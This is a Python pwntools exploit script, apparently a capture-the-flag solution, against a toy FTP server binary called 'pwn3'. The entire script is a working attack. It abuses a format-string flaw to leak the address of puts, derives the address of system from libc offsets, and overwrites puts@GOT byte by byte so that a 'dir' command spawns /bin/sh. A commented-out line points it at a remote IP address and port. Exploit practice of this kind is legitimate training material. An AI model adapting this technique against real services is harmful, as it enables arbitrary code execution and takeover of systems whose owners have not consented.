#!/usr/bin/env python
from pwn import *

# context.log_level = 'debug'

# hack the ftp server
# nc 120.27.155.82 9000

elf = ELF('pwn3')
libc = ELF('libc.so.6')

pr = process('./pwn3') 
# pr = remote('120.27.155.82', 9000)
gdb.attach(pr, 'b * 0x804889B')

username = "rxraclhm"

pr.recvuntil("Name (ftp.hacker.server:Rainism):")
pr.sendline(username)

# 1 -> get
# 2 -> put
# 3 -> dir
# other -> exit

def put(pr, name, content):
    pr.recvuntil("ftp>")
    pr.sendline('put') 
    pr.recvuntil("upload:")
    pr.sendline(name)
    pr.recvuntil("content:")
    pr.sendline(content)

def get(pr, name, num):
    pr.recvuntil("ftp>")
    pr.sendline('get')
    pr.recvuntil('get:')
    pr.sendline(name)
    return pr.recvn(num)

def dir(pr):
    pr.recvuntil("ftp>")
    pr.sendline('dir')

plt_puts = elf.symbols['puts']
print 'plt_puts= ' + hex(plt_puts)
got_puts = elf.got['puts']
print 'got_puts= ' + hex(got_puts)

# /bin/sh
put(pr, '/sh', '%8$s' + p32(got_puts))
text = get(pr, '/sh', 4)
puts_addr = u32(text)
print 'puts_addr= ' + hex(puts_addr)
system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)

def foo(name, address, num):
    num = num & 0xff
    if num == 0 : num == 0x100
    payload = '%' + str(num) + 'c%10$hhn'
    payload = payload.ljust(12, 'A') 
    put(pr, name, payload + p32(address))
    get(pr, name, 0)

foo('n', got_puts, system_addr)
foo('i', got_puts+1, system_addr>>8)
foo('b', got_puts+2, system_addr>>16)
foo('/', got_puts+3, system_addr>>24)

# system("/bin/sh")
dir(pr)
pr.interactive()
